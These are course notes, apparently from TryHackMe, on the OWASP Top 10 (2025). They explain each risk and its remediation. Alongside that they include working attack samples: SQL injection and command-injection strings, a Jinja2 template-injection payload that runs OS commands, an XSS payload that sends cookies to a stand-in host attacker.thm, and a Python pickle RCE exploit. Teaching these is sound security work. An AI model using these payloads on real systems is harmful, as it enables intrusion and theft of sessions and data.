# Module 14: OWASP Top 10 (2025)

> **Overview:** The **OWASP Top 10** is the globally recognized standard awareness document for web application security, representing the ten most critical security risks facing modern web applications. In TryHackMe's updated curriculum, these 10 risks are grouped into three functional domains: **IAAA Failures**, **Application Design Flaws**, and **Insecure Data Handling**.

---

## Summary Matrix: The OWASP Top 10 (2025)

| Rank | Category | Covered In Chapter |
| :--- | :--- | :--- |
| **A01** | **Broken Access Control** | Chapter 1: IAAA Failures |
| **A02** | **Security Misconfiguration** | Chapter 2: Application Design Flaws |
| **A03** | **Software Supply Chain Failures** | Chapter 2: Application Design Flaws |
| **A04** | **Cryptographic Failures** | Chapter 2 & Chapter 3 |
| **A05** | **Injection** | Chapter 3: Insecure Data Handling |
| **A06** | **Insecure Design** | Chapter 2: Application Design Flaws |
| **A07** | **Authentication Failures** | Chapter 1: IAAA Failures |
| **A08** | **Software or Data Integrity Failures** | Chapter 3: Insecure Data Handling |
| **A09** | **Logging & Alerting Failures** | Chapter 1: IAAA Failures |
| **A10** | **Server-Side Request Forgery (SSRF) / Exceptional Conditions** | Chapter 2 & Chapter 3 |

---

## Chapter 1: OWASP Top 10: IAAA Failures

Focuses on vulnerabilities in **Identity, Authentication, Authorization, and Accountability (IAAA)**.

### 1. A01: Broken Access Control
Occurs when an application fails to properly enforce restrictions on what authenticated (or unauthenticated) users are allowed to do.
- **Horizontal Privilege Escalation (IDOR — Insecure Direct Object Reference):**
  Accessing another user's data at the *same* privilege level by modifying a user-controlled identifier in the URL, POST body, or cookie:
  ```http
  GET /api/v1/notes?user_id=1002 HTTP/1.1
  # Changing user_id=1002 to user_id=1001 returns another user's private notes!
  ```
- **Vertical Privilege Escalation:**
  A standard user accessing administrative functionality (e.g., browsing directly to `/admin/panel` or changing a cookie/JSON parameter from `"role":"user"` to `"role":"admin"`).
- **Remediation:** Enforce server-side ownership checks on every single request; use indirect/random UUIDs instead of sequential integers where appropriate; deny access by default.

### 2. A07: Authentication Failures
Flaws in how a web application verifies user identity or manages active login sessions:
- **Weak Passwords & Credential Stuffing:** Allowing weak default passwords (`admin:admin`) or lacking rate-limiting/MFA on login endpoints.
- **Username Enumeration:** Returning verbose error messages like `"Username exists, but password is wrong"` vs. `"User not found"`.
- **Weak Session Management:**
  - Predictable session tokens (e.g., base64-encoded username or sequential IDs).
  - Failing to invalidate session tokens on the server side after logout.
  - Missing `HttpOnly`, `Secure`, and `SameSite` flags on session cookies.

### 3. A09: Security Logging & Alerting Failures
Without comprehensive logging and active alerting, breaches go undetected for months:
- **Common Failures:**
  - Failing to log critical security events (failed logins, privilege changes, high-value transactions).
  - Storing logs only locally on the web server where an attacker who achieves RCE can delete or tamper with them.
  - Sensitive data exposure *inside* logs (accidentally logging plaintext passwords, session tokens, or credit card numbers).
- **Log Injection / Forging:** If user input (like a `Username` or `User-Agent`) is written unsanitized into plain-text log files, an attacker can inject newline characters (`\r\n` / `%0d%0a`) to forge fake log entries or inject XSS payloads targeting the SOC analyst's log viewer!

---

## Chapter 2: OWASP Top 10: Application Design Flaws

Focuses on systemic architectural, configuration, and supply chain vulnerabilities.

### 1. A02: Security Misconfiguration
Occurs when systems, frameworks, cloud storage, or web servers are deployed with insecure default settings:
- **Common Examples:**
  - Default credentials left active on admin consoles (`tomcat:tomcat`, `admin:password`).
  - **Directory Listing Enabled:** Navigating to `/uploads/` or `/backup/` reveals all files in the directory.
  - **Verbose Error Messages / Debug Mode Enabled in Production:** Stack traces (e.g., Django `DEBUG = True` or Flask Werkzeug debugger) leaking source code paths, database queries, and environment variables (`SECRET_KEY`).
  - Exposed `.git` folders or backup files (`.env`, `config.php.bak`).

### 2. A03: Software Supply Chain Failures (Vulnerable & Outdated Components)
Modern applications rely heavily on third-party open-source packages (`npm`, `PyPI`, `Maven`), container base images, and CI/CD pipelines:
- **Risks:**
  - Using unpatched libraries with known CVEs (e.g., `Log4j` / `CVE-2021-44228`).
  - **Typosquatting & Dependency Confusion:** Attackers publishing malicious packages with names similar to popular internal or public libraries.
- **Remediation:** Maintain a **SBOM (Software Bill of Materials)**, pin dependency versions, and run automated SCA (Software Composition Analysis) scanners like `Dependabot` or `Snyk`.

### 3. A06: Insecure Design
Unlike implementation bugs (which can be fixed with a small code patch), **Insecure Design** refers to fundamental flaws in business logic and threat modeling:
- **Examples:**
  - A "Forgot Password" flow that relies solely on easily guessable "Security Questions" (*"What is your mother's maiden name?"*).
  - E-commerce checkout logic that trusts the item `price` or `discount` percentage sent from the client's browser (`price=-500`).
  - Missing rate limits on coupon redemption or high-cost API endpoints (**Race Conditions**).
- **Remediation:** Perform **Threat Modeling** (e.g., `STRIDE`) during the design phase before writing code.

---

## Chapter 3: OWASP Top 10: Insecure Data Handling

Focuses on vulnerabilities caused by unsafe cryptographic implementation, untrusted input parsing, and insecure deserialization.

### 1. A04: Cryptographic Failures
Occurs when sensitive data (PII, health records, credentials, session tokens) is exposed in transit or at rest due to missing or weak cryptography:
- **Common Mistakes:**
  - Transmitting sensitive data over cleartext protocols (`HTTP`, `FTP`).
  - Using broken/deprecated algorithms (`MD5`, `SHA-1`, `DES`, `ECB` block cipher mode) or **rolling your own crypto** (e.g., using a simple repeating-key `XOR` cipher or Base64 encoding to "encrypt" cookies/passwords).
  - Hardcoding encryption keys or JWT signing secrets directly in client-side code or public Git repositories.

### 2. A05: Injection
Occurs when untrusted user input is concatenated directly into an interpreter command or query instead of separating code from data:
- **SQL Injection (SQLi):**
  ```sql
  -- Vulnerable Query:
  SELECT * FROM users WHERE username = '$user' AND password = '$password';
  -- Attacker Input: admin' OR 1=1-- -
  ```
  *Fix:* Always use **Parameterized Queries (Prepared Statements)**.
- **Command Injection (OS Command Injection):**
  User input passed to `system()`, `exec()`, or `os.popen()` allows chaining shell commands via `;`, `|`, `&&`, or `` ` ``:
  ```text
  127.0.0.1; cat /etc/passwd
  ```
- **Server-Side Template Injection (SSTI):**
  When user input is concatenated directly into a server-side template (`Jinja2`, `Twig`, `Freemarker`) instead of being passed as a context variable:
  ```jinja2
  {{ 7 * 7 }}   --> Evaluates to 49!
  # Jinja2 RCE Payload:
  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
  ```
- **Cross-Site Scripting (XSS):** Injecting malicious JavaScript (`<script>fetch('http://attacker.thm/?c='+document.cookie)</script>`) into pages viewed by other users (Reflected, Stored, or DOM-based).

### 3. A08: Software or Data Integrity Failures
Occurs when an application relies on untrusted plugins, CDNs, CI/CD pipelines, or **serialized objects** without verifying their integrity:
- **Insecure Deserialization:**
  - **Serialization** converts an in-memory object into a byte stream or string (e.g., Python `pickle`, PHP `serialize()`, Java `ObjectInputStream`, `.NET` formatters) for storage or transmission in cookies/APIs.
  - **Deserialization** reconstructs the object from that byte stream.
  - **The Vulnerability:** If an application deserializes untrusted user-supplied data (such as a Base64-encoded Python `pickle` or PHP serialized object in a cookie), an attacker can craft a malicious serialized payload (using magic methods like Python's `__reduce__` or PHP's `__wakeup()`) to achieve immediate **Remote Code Execution (RCE)**!
  - **Example Python `pickle` RCE Concept:**
    ```python
    import pickle, base64, os

    class Exploit:
        def __reduce__(self):
            return (os.system, ("cp /flag.txt /app/static/flag.txt",))

    payload = base64.b64encode(pickle.dumps(Exploit())).decode()
    print(payload)
    ```
- **Subresource Integrity (SRI):** When loading third-party JavaScript from an external CDN, always include the `integrity="sha384-..."` attribute in the `<script>` tag so the browser blocks execution if the CDN is compromised.
